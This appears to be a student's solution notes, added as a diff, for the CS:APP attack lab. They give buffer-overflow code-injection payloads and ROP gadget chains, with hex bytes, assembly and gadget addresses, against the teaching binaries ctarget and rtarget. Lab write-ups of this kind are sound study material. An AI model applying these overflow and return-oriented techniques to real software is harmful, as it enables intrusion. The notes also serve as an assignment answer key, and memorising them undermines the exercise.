@@ -1,0 +1,156 @@
+***************phase_1***************
+
+touch1 address: 0x00000000004017c0
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+
+./hex2raw < touch1.txt | ./ctarget -q
+
+
+***************phase_2***************
+
+touch2 address: 0x00000000004017ec
+cookie.txt: 0x59b997fa
+injection code address: 0x5561dc78
+
+mov $0x59b997fa, %rdi  // (%rdi) = cookie
+pushq $0x4017ec	// push touch2
+ret
+
+gcc -c l2.s
+
+48 c7 c7 fa 97 b9 59 68
+ec 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+
+./hex2raw < touch2.txt | ./ctarget -q
+
+
+***************phase_3***************
+
+touch3 address: 0x00000000004018fa
+cookie.txt: 0x59b997fa  save to: 0x5561dca8 (0x5561dca0 + 0x08)
+injection code address: 0x5561dc78 (0x5561dca0 - 0x28)
+
+mov $0x5561dca8, %rdi  // (%rdi) = &cookie
+pushq $0x4018fa	// push touch3
+ret
+
+gcc -c l3.s
+
+c7 c7 a8 dc 61 55 68 fa 
+18 40 00 c3 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+
+./hex2raw < touch3.txt | ./ctarget -q
+
+
+***************phase_4***************
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+pop %rax  // 58
+-->pop %rax address: 4019ab
+ 
+cookie.txt: 0x59b997fa
+ 
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3     
+mov %rax, %rdi // 48 89 c7
+-->mov %rax, %rdi address: 4019b2
+ 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 // pop %rax
+fa 97 b9 59 00 00 00 00 // cookie
+a2 19 40 00 00 00 00 00 // mov %rax, %rdi
+ec 17 40 00 00 00 00 00 // touch2
+ 
+./hex2raw < touch4.txt | ./rtarget -q
+ 
+ 
+***************phase_5***************
+1.mov %rsp, %rax // 48 89 e0
+0000000000401a03 <addval_190>:
+ 401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+ 401a09:	c3                   	retq  
+-->mov %rsp, %rax address: 401a06
+
+2.mov %rax, %rdi // 48 89 c7
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3     
+-->mov %rax, %rdi address: 4019a2
+
+3.pop %rax  // 58
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+-->pop %rax address: 4019ab
+
+4.constant 0x48 // 0x48 -> %rax
+
+后面就是把 rax 的内容移到 rsi 或者（eax -> esi）
+
+5.movl %eax, %edx // 89 c2
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3                   	retq   
+-->movl %eax, %edx address: 4019dd
+
+6.movl %edx, %ecx // 89 d1
+0000000000401a6e <setval_167>:
+  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
+  401a74:	c3                   	retq   
+-->movl %edx, %ecx address: 401a70
+
+7.movl %ecx, %esi // 89 ce
+0000000000401a61 <addval_404>:
+  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
+  401a67:	c3                   	retq   
+-->movl %ecx, %esi address: 401a63
+
+8.lea (%rdi,%rsi,1),%rax
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+直接用 4019d6
+
+9.mov %rax, %rdi // 48 89 c7
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3     
+-->mov %rax, %rdi address: 4019a2
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 // mov %rsp,%rax
+a2 19 40 00 00 00 00 00 // mov %rax,%rdi
+ab 19 40 00 00 00 00 00 // pop %rax
+48 00 00 00 00 00 00 00 // constant 0x48
+dd 19 40 00 00 00 00 00 // movl %eax,%edx
+70 1a 40 00 00 00 00 00 // movl %edx,%ecx
+63 1a 40 00 00 00 00 00 // movl %ecx,%esi
+d6 19 40 00 00 00 00 00 // lea (%rdi,%rsi,1),%rax
+a2 19 40 00 00 00 00 00 // mov %rax,%rdi
+fa 18 40 00 00 00 00 00 // touch3
+35 39 62 39 39 37 66 61 // cookie
